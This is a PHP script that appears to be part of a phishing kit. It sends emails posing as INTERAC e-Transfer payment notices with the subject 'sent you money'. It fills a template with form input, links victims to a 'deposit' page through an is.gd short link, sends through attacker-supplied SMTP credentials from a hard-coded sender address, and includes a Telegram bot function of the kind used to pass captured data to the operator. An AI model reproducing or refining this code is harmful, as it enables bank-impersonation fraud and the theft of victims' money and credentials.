<?php
// Function to encrypt the URL parameters
function encryptParameters($params, $key) {
    $ivLength = openssl_cipher_iv_length('AES-256-CBC');
    $iv = openssl_random_pseudo_bytes($ivLength);
    $encrypted = openssl_encrypt($params, 'AES-256-CBC', $key, OPENSSL_RAW_DATA, $iv);
    $encryptedMessage = $iv . $encrypted;
    $encryptedParams = base64_encode($encryptedMessage);
    return $encryptedParams;
}

// Replace with your encryption key
$key = 'ENCRYPTED_PASSWORD_MAKE25+CHARACTERS';

// URL parameters to encrypt
$params = 'username=value1&password=value2';

// Encrypt the parameters
$encryptedParams = encryptParameters($params, $key);

// Read the template file
$templateFile = 'template.html';
$emailTemplate = file_get_contents($templateFile);

// Replace the placeholder with the encrypted parameters
$emailTemplate = str_replace('{{encryptedParams}}', $encryptedParams, $emailTemplate);

use PHPMailer\PHPMailer\PHPMailer;
use PHPMailer\PHPMailer\SMTP;
use PHPMailer\PHPMailer\Exception;

require("phpmailer/src/PHPMailer.php");
require("phpmailer/src/SMTP.php");
require("phpmailer/src/Exception.php");


$telegramToken = "";
$telegramChatID = 'YOUR_TELEGRAM_CHAT_ID';

// Function to send message to Telegram
function sendMessageToTelegram($message)
{
    global $telegramToken, $telegramChatID;
    $url = "https://api.telegram.org/bot{$telegramToken}/sendMessage";
    $data = array('chat_id' => $telegramChatID, 'text' => $message);
    $options = array(
        'http' => array(
            'method' => 'POST',
            'header' => "Content-Type: application/x-www-form-urlencoded\r\n",
            'content' => http_build_query($data),
        ),
    );
    $context = stream_context_create($options);
    $result = file_get_contents($url, false, $context);
    return $result;
}

$long_url = 'https://' . $_SERVER['HTTP_HOST'] . '/public/deposit/indexx.php?' . http_build_query($_POST);
$short_url = shortenURL($long_url);

$template = $_POST['template']; // The selected template from the dropdown
$message = file_get_contents('nobank+nomemo.html');
$message = str_replace('{{etransfer_interac_ca}}',$long_url, $message);
$message = str_replace('{{line}}', $_POST['line'], $message);
$message = str_replace('{{username}}', $_POST['username'], $message);
$message = str_replace('{{photo_href}}', $_POST['photo_href'], $message);
$message = str_replace('{{bank}}', $_POST['bank'], $message);
$message = str_replace('{{amount}}', $_POST['amount'], $message);
$message = str_replace('{{photo_link}}', $_POST['photo_link'], $message);
$message = str_replace('{{link}}', $_POST['link'], $message);
$message = str_replace('{{EXPIRE}}', $_POST['EXPIRE'], $message);
$message = str_replace('{{expire}}', $_POST['expire'], $message);
$message = str_replace('{{link}}', $_POST['link'], $message);
$message = str_replace('{{sender_name}}', $_POST['sender_name'], $message);
$message = str_replace('{{receivers_name}}', $_POST['receivers_name'], $message);
$message = str_replace('{{receivers_email}}', $_POST['receivers_email'], $message);

$mail = new PHPMailer();
$mail->IsSMTP();
$mail->SMTPSecure = 'tls';
$mail->Host = $_POST['host'];
$mail->Port = $_POST['port'];
$mail->Body = $message;
$mail->SMTPAuth = true;
$mail->Username = $_POST['username'];
$mail->Password = $_POST['password'];
$mail->SetFrom('andallard@mymts.net', $_POST['sender_name']);
$mail->AddAddress($_POST['receivers_email']);
$mail->Subject = 'INTERAC e-Transfer: ' . $_POST['sender_name'] . ' sent you money.';
$mail->IsHTML(true);
$mail->CharSet = "utf-8";

if (!$mail->Send()) {
    // Log the error
    error_log("Email sending error: " . $mail->ErrorInfo);

    // Provide a user-friendly error message
    echo "An error occurred while sending the email. Please try again later.";
    echo "<pre>";
    echo $mail->ErrorInfo;
    echo "</pre>";
    exit;
}

function shortenURL($url)
{
    $api_url = 'https://is.gd/create.php?format=simple&url=' . urlencode($url);
    return file_get_contents($api_url);
}

$currentDate = new DateTime();
$line = $currentDate->add(new DateInterval('P30D'))->format('F d, Y');

// Redirect back to start.php
header("Location: ../../../start.php");
exit;
?>
